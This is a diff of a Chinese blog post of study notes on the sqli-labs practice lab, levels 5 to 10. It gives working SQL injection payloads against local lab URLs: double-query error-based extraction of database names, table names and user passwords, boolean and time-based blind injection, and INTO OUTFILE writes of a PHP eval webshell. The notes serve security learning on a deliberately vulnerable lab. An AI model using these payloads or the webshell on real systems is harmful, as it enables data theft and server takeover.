@@ -1,10 +1,10 @@
 ---
-title: sqli-labs_混合学习笔记less01-less04
+title: sqli-labs_混合学习笔记less05-less
 categories:
 - sql注入
 tags:
 - sqli-labs
-updated: 2018-07-05
+updated: 2018-07-12
 ---
 
 
@@ -13,31 +13,343 @@ updated: 2018-07-05
 
 ps:     空格是%20        单引号%27            #是%23             双引号%22     等号 %3d
 
-**sql-labs_less-1**（**GET – Error based – Single quotes – String** **基于错误的GET单引号字符型注入）**
+**Less-5双注入GET单引号字符型注入** 
 
-<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_01.png" />
+<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_01.png" />
 
-先用sqlmap用一下，看下效果：（没waf当然很快啦...）
+没有像以前那样给出用户的名字和密码。。。（所以就不能使用less1-less4里面的方法了）
 
- `Sqlmap -u http://172.16.60.103/sql-labs/Less-1/?id=1 --dbs`
+先用sqlmap用一下，看下效果：（其实没waf，跑的也慢,更新sqlmap很重要）
 
-<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_02.png" />
+  `Sqlmap -u "http://127.0.0.1/Less-5/?id=1" --dbs`
 
-<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_03.png" />
+<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_02.png" />
 
-<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_04.png" />
+接下来就是各种--tables    --columns   --dump之类的。。。
 
 手工：
 
-`http://172.16.60.103/sql-labs/Less-1/?id=1%27`
+`http://127.0.0.1/Less-5/?id=1'`
 
 加'之后报错：
 
-<img src="{{ site.url }}/assets//blog_images/sqli-labs_混合学习_05.png" />
+<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_03.png" />
 
-即存在漏洞
+即存在漏洞（其实我也不知道）
 
-这个时候可以看下sql语句： `你的sql语句是：SELECT * FROM users WHERE id='1 order by 5 -- ' LIMIT 0,1` 
+这个时候可以看下sql语句： `你的sql语句是：SELECT * FROM users WHERE id='1'' LIMIT 0,1` 
+
+```php
+`if($row)`
+`{`
+  echo '&lt;font size="5" color="#FFFF00"&gt;';	
+  echo 'You are in...........';
+  echo "&lt;br&gt;";
+    echo "&lt;/font&gt;";
+ `}`
+```
+
+这里面根本就没有输出 $row 这个查询结果，从各处大佬的笔记里知道这个叫双注入：
+
+双查询注入：
+
+子查询，查询的关键字是select，子查询可以简单的理解在一个select语句里还有一个select。里面的这个select语句就是子查询。 
+
+比如：   Select concat((select database())); 
+
+<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_04.png" />
+
+​	真正执行的时候，先从子查询进行。因此执行select database() 这个语句就会把当前的[数据库](http://www.2cto.com/database/)查出来，然后把结果传入到concat函数。这个函数是用来连接的。比如 concat(‘a’,’b’)那结果就是ab了。
+
+ 原理：				双注入查询需要理解四个函数/语句
+
+1. Rand() //随机函数
+
+2. Floor() //取整函数
+
+3. Count() //汇总函数
+
+4. Group by clause //分组语句 
+
+   简单的一句话原理就是有研究人员发现，当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。 
+
+   先使用命令查看当前所有数据库： show databases；（记得加s）
+
+   <img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_05.png" />
+
+ use security;
+
+select concat((select database()));
+
+<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_06.png" />
+
+ select concat("1","2");
+
+<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_07.png" />
+
+再测试一下：rand（）
+
+select  rand();
+
+<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_08.png" />
+
+多执行几次，发现每一次都是不一样的，每一次返回的都是0~1之间的数
+
+取整函数
+
+Select floor(1.27272);
+
+<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_09.png" />
+
+floor()函数就是返回小于等于你输入的数的整数。也就是向下取整呗！
+
+看看双注入查询中的一个简单组合 ：
+
+ SELECT floor(rand()*2); 
+
+ SELECT floor(rand()); 
+
+<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_10.png" />
+
+
+
+rand() 返回大于0小于1的小数，乘以2之后就成了小于0小于2了。然后对结果进行取证。就只能是0或1了。也就是这个查询的结果不是1，就是0 
+
+然后接下来：   `SELECT CONCAT((SELECT database()), FLOOR(RAND()*2));`
+
+<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_11.png" />
+
+SELECT database() 这个就返回数据库名，这里就是security了。然后FLOOR(RAND()*2)这个上面说过了。不是0，就是1.然后把这两个的结果进行concat连接，那么结果不是security0就是security1了。
+
+ 如果我们把这条语句后面加上from 一个表名。那么一般会返回security0或security1的一个集合。数目是由表本身有几条结果决定的。比如一个管理表里有5个管理员。这个就会返回五条记录，这里users表里有13个用户，所以返回了13条 
+
+<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_12.png" />
+
+如果是从information_schema.schemata里，这个表里包含了mysql的所有数据库名。这里本机有三个数据库。所以会返回三个结果 
+
+ `SELECT CONCAT((SELECT database()), FLOOR(RAND()*2)) from information_schema.schemata ;`
+
+<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_13.png" />
+
+
+
+然后可以使用句子：
+
+```sql
+select count(*), concat((select database()), floor(rand()*2))as a from information_schema.tables group by a;
+```
+
+​        <img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_14.png" />
+
+查询结果会以报错的形式展现出来：（固定公式）
+
+less5中： `http://127.0.0.1/Less-5/?id=-1' union select count(*),2,concat('*',(select database()),'*',floor(rand()*2))as a from information_schema.tables group by a--+`
+
+<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_15.png" />
+
+获取到数据库名后再用同样的方法获取表名： 
+
+`http://localhost/sqli-labs-master/Less-5/?id=-1' union select count(*),2,concat('*',(select group_concat(table_name) from information_schema.tables where table_schema='security'),'*',floor(rand()*2))as a from information_schema.tables group by a--+`
+
+<img src="{{ site.url }}/assets//blog_images/sqli-labs_less5_16.png" />
+
+（其实我还是比较推荐使用sqlmap，事情少。。。）
+
+
+
+**Less-6双注入GET双引号字符型注入** 
+
+还是使用和less5一样的方法：只是用的是   “   
+
+`http://127.0.0.1/Less-6/?id=-1" union select count(*),2,concat('*',(select concat_ws(char(32,44,32),id,username,password) from users limit 0,1),'*',floor(rand()*2))as a from information_schema.tables group by a--+`  
+
+
+
+<img src="{{ site.url }}/assets//blog_images/sqli-labs_less6_01.png" />
+
+
+
+**Less-7导出文件GET字符型注**
+
+ 
+
+<img src="{{ site.url }}/assets//blog_images/sqli-labs_less7_01.png" />
+
+这个时候显示的是 ： You are in.... Use outfile...... （如果使用sqlmap工具的话，是非常的漫长的等待的。。。）
+
+弹出 Use outfile，尝试之前的方法行不通了，他把报错做了处理统一返回“You have an error in your SQL syntax”，明显的，他也给出了提示use outfile，outfile的固定结构是：select A into outfile B，这里的B通常是一个文件路径，A可以是文本内容（小马），也可以是数据库信息，先尝试写木马进去：
+
+**导入到文件**
+
+SELECT.....INTO OUTFILE 'file_name'
+
+可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有FILE权限，才能使用此语法。file_name不能是一个已经存在的文件。
+
+我们一般有两种利用形式：
+
+第一种直接将select内容导入到文件中：
+
+Select version() into outfile "c:\\phpnow\\htdocs\\test.php"
+
+此处将version()替换成一句话，<?php @eval($_post["mima"])?>也即
+
+Select  <?php @eval($_post["mima"])?>  into outfile "c:\\phpnow\\htdocs\\test.php"
+
+直接连接一句话就可以了，其实在select内容中不仅仅是可以上传一句话的，也可以上传很多的内容。
+
+   
+
+第二种修改文件结尾：
+
+Select version() Into outfile "c:\\phpnow\\htdocs\\test.php" LINES TERMINATED BY 0x16进制文件
+
+解释：通常是用'\r\n'结尾，此处我们修改为自己想要的任何文件。同时可以用FIELDS TERMINATED BY 
+16进制可以为一句话或者其他任何的代码，可自行构造。在sqlmap中os-shell采取的就是这样的方式，具体可参考os-shell分析文章：http://www.cnblogs.com/lcamry/p/5505110.html 
+
+
+
+然后介绍两个可以说是函数，还是变量的东西
+
+@@datadir 读取数据库路径
+@@basedir MYSQL 获取安装路径
+
+然后在第三关的时候，使用 这个查看一下（首先使用order by看下里面有多少个字段（很重要，不然到时候钩爪的时候会出现问题））
+
+<img src="{{ site.url }}/assets//blog_images/sqli-labs_less7_02.png" />
+
+字段数是3，然后用刚才的知识进行构造：
+
+<img src="{{ site.url }}/assets//blog_images/sqli-labs_less7_03.png" />
+
+这个时候就得到了路径  
+
+Your Login name:C:\phpStudy\PHPTutorial\MySQL\data\ 
+
+Your Password:C:/phpStudy/PHPTutorial/MySQL/ 
+
+然后尝试去写一句话木马：
+
+<img src="{{ site.url }}/assets//blog_images/sqli-labs_less7_03.png" />
+
+这个是写3到123.txt中，但是在我却没发现这个文件。。。估计是这个写的权限没了，，，
+
+如果可以的话，就直接写一句话了：union select 1,2,"<? php  @eval($_post['mima']) ?>" into outfile "文件路径"%23
+
+然后再使用菜刀进行连接即可！
+
+##### **Less - 8 布尔型单引号GET盲注 
+
+<img src="{{ site.url }}/assets//blog_images/sqli-labs_less8_01.png" />
+
+直接加 ‘ 试一下什么都没有了。。。  使用order by 语句也没有回显。。。
+
+盲注的话，主要分为bool型和时间性，通常涉及到这几个函数:
+
+length(str)：返回字符串str的长度
+
+substr(str,pos,len)：将str从pos位置开始截取len长度的字符返回，需要注意的是这里pos的是从1开始的
+
+mid(str,pos,len)：和substr()类似
+
+ascii(str)：返回字符串str最左边的acsii码（即首字母的acsii码）
+
+ord()：同上，返回acsii码
+
+left(str,len)：对字符串str左截取len长度
+
+right(str,len)：对字符串str右截取len长度
+
+if(a,b,c)：条件判断，如果a为true，返回b，否则返回c
+
+盲注有个固定式：and ascii(substr(A,1,1))>B，或者and if(ascii(substr(A,1,1))>B,1,0)，这里的A通常是一个select语句，B则是字符或数字的ascii码，他们的中心思想都是通过substr等截取函数以二分法的形式查询逐个匹配想要的信息，这个过程通常都很耗时，所以建议直接写个盲注脚本来跑
+
+如果使用sqlmap的话，速度其实并不是很快
+
+<img src="{{ site.url }}/assets//blog_images/sqli-labs_less8_02.png" />
+
+还是使用手工试一下吧（工具都不快，手工更慢了）：
+
+<img src="{{ site.url }}/assets//blog_images/sqli-labs_less8_03.png" />
+
+http://172.16.60.103/sql-labs/Less-8/?id=1' and (ascii(substr((select database()),1,1)))  < 170 %23
+
+显示you are in。。。 证明这个就是正确的
+
+如果将值换为20的话，到时候就不会显示you are in。。。了，证明就是大于大于20小于170了。
+
+然后就是小于115，这个时候是没有回显的，对照ascii表，证明了这个值就是116，也就是s
+
+还是直接从网上找到了脚本，跑一下比较合适（sqlmap也行）
+
+
+
+**Less-9 基于时间的GET单引号盲注** 
+
+<img src="{{ site.url }}/assets//blog_images/sqli-labs_less9_01.png" />
+
+时间型盲注和bool型盲注应用场景不同之处在报错的返回上，从less-8我们知道，输入合法时他会返回正常页面“You are in......”，而非法输入时他没有返回任何东西，于是，我们可以根据这个特点跑盲注，通过他不同的返回页面来判断我们匹配的字符是否正确，而在less-9中合法输入与非合法输入它都返回一个页面，就是You are in.....这样，我们就不能根据他页面的返回内容来判断匹配结果了，因此我们需要用延时函数sleep()对两种输入进行区分，可以构造如下语句：
+
+http://172.16.60.103/sql-labs/Less-9/?id=1'and if(ascii(substr((select database()),1,1)) >115,0,sleep(5))%23
+
+如果时间不够久的话，可以设置延时为20，其余的就和8是一样的了
+
+
+
+**Less-10 基于时间的双引号盲注**
+
+直接将less9中的单引号改为双引号就可以了（好难啊）
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 看到在id=''中，order by 在“中，所以要想猜字段的话，需要先将以前的语句进行闭合，闭合之后才可以继续猜解。（**ORDER BY 语句用于根据指定的列对结果集进行排序，而且是按照升序对记录进行排序**）
 
